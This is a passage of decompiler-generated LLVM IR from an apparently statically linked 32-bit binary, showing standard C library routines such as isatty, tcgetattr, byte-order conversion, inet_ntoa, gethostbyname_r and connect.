  %v4_8052198 = call i32 @strtok_r(i8* %v3_8052198, i32 %arg2, i32 ptrtoint (i32* @global_var_8061580.485 to i32))
  ret i32 %v4_8052198
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_80521b0 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_80521b5 = icmp eq i32 %v3_80521b0, 0
  %v1_80521b7 = zext i1 %v1_80521b5 to i32
  ret i32 %v1_80521b7
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80521c4 = load i32, i32* @esi, align 4
  %v0_80521c5 = load i32, i32* @ebx, align 4
  store i32 %v0_80521c5, i32* %stack_var_-8, align 4
  %v2_80521c9 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80521c9, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_80521db = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_80521c9)
  store i32 %v3_80521db, i32* %eax.global-to-local, align 4
  store i32 %v3_80521db, i32* @esi, align 4
  %v1_80521e5 = icmp eq i32 %v3_80521db, 0
  %v1_80521e7 = icmp eq i1 %v1_80521e5, false
  br i1 %v1_80521e7, label %dec_label_pc_805222c, label %dec_label_pc_80521e9

dec_label_pc_80521e9:                             ; preds = %entry
  %v3_80521e9 = load i32, i32* %stack_var_-44, align 4
  %v1_80521ed = load i32, i32* @ebx, align 4
  %v2_80521ed = inttoptr i32 %v1_80521ed to i32*
  store i32 %v3_80521e9, i32* %v2_80521ed, align 4
  %v1_80521f3 = load i32, i32* @ebx, align 4
  %v2_80521f3 = add i32 %v1_80521f3, 4
  %v3_80521f3 = inttoptr i32 %v2_80521f3 to i32*
  %v1_80521fa = load i32, i32* @ebx, align 4
  %v2_80521fa = add i32 %v1_80521fa, 8
  %v3_80521fa = inttoptr i32 %v2_80521fa to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_8052201 = load i32, i32* @ebx, align 4
  %v2_8052201 = add i32 %v1_8052201, 12
  %v3_8052201 = inttoptr i32 %v2_8052201 to i32*
  store i32 %tmp3, i32* %v3_8052201, align 4
  %v4_8052204 = zext i8 %tmp to i32
  %v5_8052204 = load i32, i32* %eax.global-to-local, align 4
  %v6_8052204 = and i32 %v5_8052204, -256
  %v7_8052204 = or i32 %v6_8052204, %v4_8052204
  store i32 %v7_8052204, i32* %eax.global-to-local, align 4
  %v2_8052208 = load i32, i32* @ebx, align 4
  %v3_8052208 = add i32 %v2_8052208, 16
  %v4_8052208 = inttoptr i32 %v3_8052208 to i8*
  store i8 %tmp, i8* %v4_8052208, align 1
  %v0_805220b = load i32, i32* %eax.global-to-local, align 4
  %v2_805220e = ptrtoint i32* %stack_var_-27 to i32
  %v0_8052213 = load i32, i32* @ebx, align 4
  %v1_8052213 = add i32 %v0_8052213, 17
  store i32 %v1_8052213, i32* %eax.global-to-local, align 4
  %v4_8052217 = call i32 @__GI_mempcpy(i32 %v1_8052213, i32 %v2_805220e, i32 19, i32 %v0_805220b)
  store i32 %v4_8052217, i32* %eax.global-to-local, align 4
  %v3_8052224 = inttoptr i32 %v4_8052217 to i8*
  %v4_8052224 = call i32 @__GI_memset(i8* %v3_8052224, i32 0, i32 13)
  store i32 %v4_8052224, i32* %eax.global-to-local, align 4
  %v0_805222c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805222c

dec_label_pc_805222c:                             ; preds = %entry, %dec_label_pc_80521e9
  %v0_805222c = phi i32 [ %v3_80521db, %entry ], [ %v0_805222c.pre, %dec_label_pc_80521e9 ]
  store i32 %v0_805222c, i32* %eax.global-to-local, align 4
  %v2_8052231 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052231, i32* @ebx, align 4
  store i32 %v0_80521c4, i32* @esi, align 4
  ret i32 %v0_805222c

; uselistorder directives
  uselistorder i32 %v0_805222c, { 1, 0 }
  uselistorder i32 %v3_80521db, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805222c, { 1, 0 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8052238 = trunc i32 %arg1 to i16
  %v2_8052238 = call i16 @llvm.bswap.i16(i16 %v1_8052238)
  %v3_8052238 = zext i16 %v2_8052238 to i32
  ret i32 %v3_8052238
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_8052244 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_8052244
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805224b = trunc i32 %arg1 to i16
  %v2_805224b = call i16 @llvm.bswap.i16(i16 %v1_805224b)
  %v3_805224b = zext i16 %v2_805224b to i32
  ret i32 %v3_805224b
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8052257 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8052257
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805225c = load i32, i32* @edi, align 4
  %v0_805225d = load i32, i32* @esi, align 4
  %v0_805225e = load i32, i32* @ebx, align 4
  store i32 %v0_805225e, i32* %stack_var_-12, align 4
  store i32 0, i32* @edi, align 4
  %v1_8052269 = add i32 %arg2, 15
  store i32 %v1_8052269, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_805226e = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_805226e, 16777216
  %v1_8052270 = sdiv i32 %sext, 16777216
  store i32 %v1_8052270, i32* @ebx, align 4
  br label %dec_label_pc_8052274

dec_label_pc_8052274:                             ; preds = %entry, %dec_label_pc_8052299
  %v0_805227717 = phi i32 [ %v1_8052270, %entry ], [ %v2_8052299, %dec_label_pc_8052299 ]
  %v0_80522a416 = phi i32 [ %v1_8052269, %entry ], [ %v0_805229d, %dec_label_pc_8052299 ]
  %v1_8052279 = urem i32 %v0_805227717, 256
  %v5_8052287 = inttoptr i32 %v0_80522a416 to i8*
  %v6_8052287 = call i32 @_uintmaxtostr(i8* %v5_8052287, i32 %v1_8052279, i32 0, i32 -10, i32 0)
  %v0_805228f = load i32, i32* @esi, align 4
  %v1_805228f = icmp eq i32 %v0_805228f, 0
  %v1_8052291 = add i32 %v6_8052287, -1
  store i32 %v1_8052291, i32* %ecx.global-to-local, align 4
  br i1 %v1_805228f, label %dec_label_pc_8052299, label %dec_label_pc_8052296

dec_label_pc_8052296:                             ; preds = %dec_label_pc_8052274
  %v1_8052296 = inttoptr i32 %v0_805228f to i8*
  store i8 46, i8* %v1_8052296, align 1
  %v0_805229d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052299

dec_label_pc_8052299:                             ; preds = %dec_label_pc_8052274, %dec_label_pc_8052296
  %v0_805229d = phi i32 [ %v1_8052291, %dec_label_pc_8052274 ], [ %v0_805229d.pre, %dec_label_pc_8052296 ]
  %v0_8052299 = load i32, i32* @ebx, align 4
  %v2_8052299 = udiv i32 %v0_8052299, 256
  store i32 %v2_8052299, i32* @ebx, align 4
  %v0_805229c = load i32, i32* @edi, align 4
  %v1_805229c = add i32 %v0_805229c, 1
  store i32 %v1_805229c, i32* @edi, align 4
  store i32 %v0_805229d, i32* @esi, align 4
  %v7_80522a2 = icmp sgt i32 %v1_805229c, 3
  br i1 %v7_80522a2, label %dec_label_pc_80522a4, label %dec_label_pc_8052274

dec_label_pc_80522a4:                             ; preds = %dec_label_pc_8052299
  %v1_80522a4 = add i32 %v0_805229d, 1
  %v2_80522a7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80522a7, i32* @ebx, align 4
  store i32 %v0_805225d, i32* @esi, align 4
  store i32 %v0_805225c, i32* @edi, align 4
  ret i32 %v1_80522a4

; uselistorder directives
  uselistorder i32 %v0_805229d, { 0, 2, 1 }
  uselistorder i32 %v1_8052270, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052299, { 1, 0 }
  uselistorder label %dec_label_pc_8052274, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_80522b7 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_8061584.486 to i32))
  ret i32 %v2_80522b7
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_80522c3 = ptrtoint i32* %stack_var_-4 to i32
  %v2_80522cc = inttoptr i32 %arg1 to i8*
  %v3_80522cc = call i32 @inet_aton(i8* %v2_80522cc, i32 %v2_80522c3)
  %v1_80522d7 = icmp eq i32 %v3_80522cc, 0
  br i1 %v1_80522d7, label %dec_label_pc_80522df, label %dec_label_pc_80522db

dec_label_pc_80522db:                             ; preds = %entry
  %v3_80522db = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80522df

dec_label_pc_80522df:                             ; preds = %entry, %dec_label_pc_80522db
  %v0_80522df = phi i32 [ -1, %entry ], [ %v3_80522db, %dec_label_pc_80522db ]
  ret i32 %v0_80522df

; uselistorder directives
  uselistorder label %dec_label_pc_80522df, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80522eb = call i32 @__GI___h_errno_location()
  %v0_80522f0 = load i32, i32* @edx, align 4
  %v2_80522f3 = ptrtoint i32* %stack_var_-4 to i32
  %v9_805230b = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_806176c.488, i32 ptrtoint (i32* @global_var_80615a0.487 to i32), i32 460, i32 %v2_80522f3, i32 %v0_80522eb, i32 %v0_80522f0, i32 %v0_80522f0)
  %v3_8052310 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8052310
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8052318 = load i32, i32* @ebp, align 4
  %v0_8052319 = load i32, i32* @edi, align 4
  %v0_805231a = load i32, i32* @esi, align 4
  %v0_805231b = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_805232b = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_805232b, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8052336 = icmp eq i32 %arg1, 0
  br i1 %v4_8052336, label %dec_label_pc_8052642, label %dec_label_pc_8052341

dec_label_pc_8052341:                             ; preds = %entry
  %v1_8052341 = call i32 @__errno_location(i32 %v0_805231b)
  store i32 %v1_8052341, i32* %eax.global-to-local, align 4
  store i32 %v1_8052341, i32* @esi, align 4
  %v1_8052348 = inttoptr i32 %v1_8052341 to i32*
  %v2_8052348 = load i32, i32* %v1_8052348, align 4
  store i32 %v2_8052348, i32* @edi, align 4
  store i32 0, i32* %v1_8052348, align 4
  %v0_8052359 = load i32, i32* @ebx, align 4
  store i32 %v0_8052359, i32* %stack_var_-108, align 4
  %v7_8052365 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_8052359, i32 %arg5, i32 %arg6, i32 %v1_8052341)
  store i32 %v7_8052365, i32* %eax.global-to-local, align 4
  %v1_805236d = icmp eq i32 %v7_8052365, 0
  br i1 %v1_805236d, label %dec_label_pc_8052642, label %dec_label_pc_8052375

dec_label_pc_8052375:                             ; preds = %dec_label_pc_8052341
  %v1_8052379 = inttoptr i32 %arg6 to i32*
  %v2_8052379 = load i32, i32* %v1_8052379, align 4
  store i32 %v2_8052379, i32* %edx.global-to-local, align 4
  %v9_805237b = icmp eq i32 %v2_8052379, 1
  br i1 %v9_805237b, label %dec_label_pc_8052395, label %dec_label_pc_8052380

dec_label_pc_8052380:                             ; preds = %dec_label_pc_8052375
  %v9_8052380 = icmp eq i32 %v2_8052379, 4
  br i1 %v9_8052380, label %dec_label_pc_8052395, label %dec_label_pc_8052385

dec_label_pc_8052385:                             ; preds = %dec_label_pc_8052380
  %v1_8052385 = add i32 %v2_8052379, 1
  %v8_8052385 = icmp eq i32 %v1_8052385, 0
  store i32 %v1_8052385, i32* %edx.global-to-local, align 4
  %v1_8052386 = icmp eq i1 %v8_8052385, false
  br i1 %v1_8052386, label %dec_label_pc_8052642, label %dec_label_pc_805238c

dec_label_pc_805238c:                             ; preds = %dec_label_pc_8052385
  %v0_805238c = load i32, i32* @esi, align 4
  %v1_805238c = inttoptr i32 %v0_805238c to i32*
  %v2_805238c = load i32, i32* %v1_805238c, align 4
  %v11_805238c = icmp eq i32 %v2_805238c, 2
  %v1_805238f = icmp eq i1 %v11_805238c, false
  br i1 %v1_805238f, label %dec_label_pc_8052642, label %dec_label_pc_8052395

dec_label_pc_8052395:                             ; preds = %dec_label_pc_805238c, %dec_label_pc_8052380, %dec_label_pc_8052375
  %v0_8052395 = load i32, i32* @ebp, align 4
  store i32 %v0_8052395, i32* %eax.global-to-local, align 4
  %v0_8052397 = load i32, i32* @edi, align 4
  %v1_8052397 = load i32, i32* @esi, align 4
  %v2_8052397 = inttoptr i32 %v1_8052397 to i32*
  store i32 %v0_8052397, i32* %v2_8052397, align 4
  %v0_8052399 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052399 = sub i32 0, %v0_8052399
  %v1_805239b = urem i32 %v1_8052399, 4
  %v2_805239b = icmp eq i32 %v1_805239b, 0
  store i32 %v1_805239b, i32* %eax.global-to-local, align 4
  %v0_80523b0.pre = load i32, i32* @ebx, align 4
  br i1 %v2_805239b, label %dec_label_pc_80523ac, label %dec_label_pc_80523a0

dec_label_pc_80523a0:                             ; preds = %dec_label_pc_8052395
  %v2_80523a0 = sub i32 %v0_80523b0.pre, %v1_805239b
  %v7_80523a0 = icmp ult i32 %v0_80523b0.pre, %v1_805239b
  br i1 %v7_80523a0, label %dec_label_pc_805263d, label %dec_label_pc_80523a8

dec_label_pc_80523a8:                             ; preds = %dec_label_pc_80523a0
  %v0_80523a8 = load i32, i32* @ebp, align 4
  %v2_80523a8 = add i32 %v0_80523a8, %v1_805239b
  store i32 %v2_80523a8, i32* @ebp, align 4
  store i32 %v2_80523a0, i32* @ebx, align 4
  br label %dec_label_pc_80523ac

dec_label_pc_80523ac:                             ; preds = %dec_label_pc_8052395, %dec_label_pc_80523a8
  %v0_80523b0 = phi i32 [ %v2_80523a0, %dec_label_pc_80523a8 ], [ %v0_80523b0.pre, %dec_label_pc_8052395 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_8052379, align 4
  %tmp43 = icmp ult i32 %v0_80523b0, 4
  br i1 %tmp43, label %dec_label_pc_805263d, label %dec_label_pc_80523bf

dec_label_pc_80523bf:                             ; preds = %dec_label_pc_80523ac
  %v0_80523bf = load i32, i32* @ebx, align 4
  %v1_80523bf = add i32 %v0_80523bf, -4
  store i32 %v1_80523bf, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_80523bf, 8
  br i1 %tmp44, label %dec_label_pc_805263d, label %dec_label_pc_80523cb

dec_label_pc_80523cb:                             ; preds = %dec_label_pc_80523bf
  %v0_80523cb = load i32, i32* @ebp, align 4
  %v1_80523cb = add i32 %v0_80523cb, 4
  store i32 %v1_80523cb, i32* %edx.global-to-local, align 4
  %v1_80523ce = add i32 %v0_80523bf, -12
  store i32 %v1_80523ce, i32* %eax.global-to-local, align 4
  store i32 %v1_80523cb, i32* %stack_var_-92, align 4
  %v3_80523d7 = inttoptr i32 %v1_80523cb to i32*
  store i32 %v0_80523cb, i32* %v3_80523d7, align 4
  %v0_80523da = load i32, i32* %edx.global-to-local, align 4
  %v1_80523da = add i32 %v0_80523da, 4
  %v2_80523da = inttoptr i32 %v1_80523da to i32*
  store i32 0, i32* %v2_80523da, align 4
  %tmp45 = icmp ult i32 %v1_80523ce, 32
  br i1 %tmp45, label %dec_label_pc_805263d, label %dec_label_pc_80523e7

dec_label_pc_80523e7:                             ; preds = %dec_label_pc_80523cb
  %v0_80523e7 = load i32, i32* @ebx, align 4
  %v1_80523e7 = add i32 %v0_80523e7, -44
  store i32 %v1_80523e7, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_80523e7, 256
  br i1 %tmp46, label %dec_label_pc_805263d, label %dec_label_pc_80523fa

dec_label_pc_80523fa:                             ; preds = %dec_label_pc_80523e7
  %v0_80523fa = load i32, i32* @ebp, align 4
  %v1_80523fa = add i32 %v0_80523fa, 12
  %v1_80523fd = add i32 %v0_80523fa, 44
  store i32 %v1_80523fd, i32* @edi, align 4
  store i32 %v1_80523fd, i32* %stack_var_-108, align 4
  %v3_805240e = inttoptr i32 %v1_80523fd to i8*
  %v4_805240e = call i32 @strncpy(i8* %v3_805240e, i32 %arg1, i32 %v1_80523e7)
  %v0_8052413 = load i32, i32* @edi, align 4
  %v1_8052413 = load i32, i32* @ebp, align 4
  %v2_8052413 = add i32 %v1_8052413, 12
  %v3_8052413 = inttoptr i32 %v2_8052413 to i32*
  store i32 %v0_8052413, i32* %v3_8052413, align 4
  %v1_805241a = add i32 %v0_80523fa, 16
  %v2_805241a = inttoptr i32 %v1_805241a to i32*
  store i32 0, i32* %v2_805241a, align 4
  %v2_8052421 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8052421, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_8052423 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_8052428 = inttoptr i32 %arg1 to i8*
  %v3_8052428 = call i32 @inet_aton(i8* %v2_8052428, i32 %v0_8052423)
  store i32 %v3_8052428, i32* %eax.global-to-local, align 4
  %v1_8052430 = icmp eq i32 %v3_8052428, 0
  br i1 %v1_8052430, label %dec_label_pc_805246c, label %dec_label_pc_8052434

dec_label_pc_8052434:                             ; preds = %dec_label_pc_80523fa
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_8052438 = load i32, i32* @edi, align 4
  store i32 %v0_8052438, i32* %arg2, align 4
  %v1_805243a = add i32 %tmp18, 8
  %v2_805243a = inttoptr i32 %v1_805243a to i32*
  store i32 2, i32* %v2_805243a, align 4
  %v0_8052441 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052441 = add i32 %v0_8052441, 12
  %v2_8052441 = inttoptr i32 %v1_8052441 to i32*
  store i32 4, i32* %v2_8052441, align 4
  %v2_8052448 = load i32, i32* %stack_var_-92, align 4
  %v1_805244b = load i32, i32* %edx.global-to-local, align 4
  %v2_805244b = add i32 %v1_805244b, 16
  %v3_805244b = inttoptr i32 %v2_805244b to i32*
  store i32 %v2_8052448, i32* %v3_805244b, align 4
  %v1_8052452 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052452 = add i32 %v1_8052452, 4
  %v3_8052452 = inttoptr i32 %v2_8052452 to i32*
  store i32 %v1_80523fa, i32* %v3_8052452, align 4
  %v0_8052459 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8052459, i32* %v1_805232b, align 4
  store i32 0, i32* %v1_8052379, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052642

dec_label_pc_805246c:                             ; preds = %dec_label_pc_80523fa
  %v0_805246c = call i32 @__open_nameservers()
  store i32 %v0_805246c, i32* @eax, align 4
  %v2_805247c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_805247c, i32* @ebx, align 4
  store i32 %v2_805247c, i32* %stack_var_-108, align 4
  %v2_8052481 = call i32 @__pthread_return_void(i32 %v2_805247c, i32 134562611)
  store i32 %v2_8052481, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %stack_var_-108, align 4
  %v1_805248d = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b508.489 to i32))
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* @ecx, align 4
  store i32 134562611, i32* @eax, align 4
  store i32 %v2_805247c, i32* %stack_var_-108, align 4
  %v0_8052497 = load i32, i32* @global_var_8061bf4.490, align 4
  store i32 %v0_8052497, i32* @esi, align 4
  %v2_805249d = call i32 @__pthread_return_void(i32 %v2_805247c, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_80524b8 = ptrtoint i32* %stack_var_-76 to i32
  %v2_80524bd = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80524bd, i32* %eax.global-to-local, align 4
  store i32 %v2_80524bd, i32* %stack_var_-108, align 4
  %v0_80524c7 = load i32, i32* @esi, align 4
  %v7_80524ce = call i32 @__dns_lookup(i8* %v2_8052428, i32 1, i32 %v0_80524c7, i32 ptrtoint (i32* @global_var_8061be8.491 to i32), i32 %v2_80524bd, i32 %v2_80524b8)
  store i32 %v7_80524ce, i32* %eax.global-to-local, align 4
  %v2_80524d6 = icmp slt i32 %v7_80524ce, 0
  %v1_80524d8 = icmp eq i1 %v2_80524d6, false
  br i1 %v1_80524d8, label %dec_label_pc_80524ee, label %dec_label_pc_80524da

dec_label_pc_80524da:                             ; preds = %dec_label_pc_805246c
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_8052379, align 4
  br label %dec_label_pc_8052642

dec_label_pc_80524ee:                             ; preds = %dec_label_pc_805246c
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_8052501 = icmp ugt i32 %v1_80523e7, 256
  %v15_8052501 = icmp eq i32 %v0_80523e7, 300
  %v2_8052505 = or i1 %v15_8052501, %v10_8052501
  br i1 %v2_8052505, label %dec_label_pc_80525a0, label %dec_label_pc_8052507

dec_label_pc_8052507:                             ; preds = %dec_label_pc_80524ee
  %v3_805250a = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805250a, i32* %stack_var_-108, align 4
  %v1_805250e = call i32 @free(i32 %v3_805250a)
  store i32 %v1_805250e, i32* %eax.global-to-local, align 4
  store i32 %v3_805250a, i32* @edi, align 4
  %v3_8052514 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052514, i32* %stack_var_-108, align 4
  %v1_8052518 = call i32 @free(i32 %v3_8052514)
  store i32 -1, i32* %v1_8052379, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052618

dec_label_pc_80525a0:                             ; preds = %dec_label_pc_80524ee
  %v3_80525a5.pre = load i32, i32* %stack_var_-76, align 4
  %v0_80525a9.pre = load i32, i32* @edi, align 4
  store i32 %v0_80525a9.pre, i32* %stack_var_-108, align 4
  %v3_80525aa = inttoptr i32 %v0_80525a9.pre to i8*
  %v4_80525aa = call i32 @strncpy(i8* %v3_80525aa, i32 %v3_80525a5.pre, i32 %v1_80523e7)
  store i32 %v4_80525aa, i32* %eax.global-to-local, align 4
  %v3_80525b0 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_80525b0, i32* %stack_var_-108, align 4
  %v1_80525b4 = call i32 @free(i32 %v3_80525b0)
  store i32 %v1_80525b4, i32* %eax.global-to-local, align 4
  %v12_80525bc = icmp eq i32 %tmp10, 1
  %v1_80525c1 = icmp eq i1 %v12_80525bc, false
  br i1 %v1_80525c1, label %dec_label_pc_805261d, label %dec_label_pc_80525c3

dec_label_pc_80525c3:                             ; preds = %dec_label_pc_80525a0
  %v0_80525c3 = load i32, i32* @edx, align 4
  %v0_80525ca = load i32, i32* @ebp, align 4
  store i32 %v0_80525ca, i32* %stack_var_-108, align 4
  %v3_80525cb = inttoptr i32 %tmp to i16*
  %v4_80525cb = call i32 @memcpy(i16* %v3_80525cb, i32 4, i32 %v0_80525c3)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_80525d4 = load i32, i32* @edi, align 4
  store i32 %v0_80525d4, i32* %arg2, align 4
  %v1_80525d6 = add i32 %tmp18, 8
  %v2_80525d6 = inttoptr i32 %v1_80525d6 to i32*
  store i32 2, i32* %v2_80525d6, align 4
  %v0_80525dd = load i32, i32* %eax.global-to-local, align 4
  %v1_80525dd = add i32 %v0_80525dd, 12
  %v2_80525dd = inttoptr i32 %v1_80525dd to i32*
  store i32 4, i32* %v2_80525dd, align 4
  %v3_80525e4 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_80525e4, i32* %edx.global-to-local, align 4
  %v1_80525e8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80525e8 = add i32 %v1_80525e8, 16
  %v3_80525e8 = inttoptr i32 %v2_80525e8 to i32*
  store i32 %v3_80525e4, i32* %v3_80525e8, align 4
  %v1_80525ef = load i32, i32* %eax.global-to-local, align 4
  %v2_80525ef = add i32 %v1_80525ef, 4
  %v3_80525ef = inttoptr i32 %v2_80525ef to i32*
  store i32 %v1_80523fa, i32* %v3_80525ef, align 4
  %v2_80525f2 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_80525f2, i32* %eax.global-to-local, align 4
  %v3_80525f3 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_80525f3, i32* %stack_var_-108, align 4
  %v1_80525f7 = call i32 @free(i32 %v3_80525f3)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_805232b, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_8052379, align 4
  br label %dec_label_pc_8052618

dec_label_pc_8052618:                             ; preds = %dec_label_pc_805261d, %dec_label_pc_8052507, %dec_label_pc_80525c3
  br label %dec_label_pc_8052642

dec_label_pc_805261d:                             ; preds = %dec_label_pc_80525a0
  %v3_8052620 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052620, i32* %stack_var_-108, align 4
  %v1_8052624 = call i32 @free(i32 %v3_8052620)
  store i32 1, i32* %v1_8052379, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052618

dec_label_pc_805263d:                             ; preds = %dec_label_pc_80523e7, %dec_label_pc_80523cb, %dec_label_pc_80523bf, %dec_label_pc_80523ac, %dec_label_pc_80523a0
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052642

dec_label_pc_8052642:                             ; preds = %dec_label_pc_805238c, %dec_label_pc_8052385, %dec_label_pc_8052341, %entry, %dec_label_pc_8052618, %dec_label_pc_80524da, %dec_label_pc_8052434, %dec_label_pc_805263d
  store i32 %v0_805231b, i32* @ebx, align 4
  store i32 %v0_805231a, i32* @esi, align 4
  store i32 %v0_8052319, i32* @edi, align 4
  store i32 %v0_8052318, i32* @ebp, align 4
  %v0_8052649 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8052649

; uselistorder directives
  uselistorder i32 %v2_805247c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_80523fd, { 1, 0, 2 }
  uselistorder i32 %v1_80523fa, { 1, 0 }
  uselistorder i32 %v1_80523e7, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_80523b0.pre, { 0, 2, 1 }
  uselistorder i32 %v1_805239b, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8052379, { 2, 0, 1, 3 }
  uselistorder i32* %v1_8052379, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_805232b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8052642, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052618, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80523ac, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052667 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805266e = call i32 @__socketcall(i32 3, i32 %v2_8052667)
  ret i32 %v2_805266e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
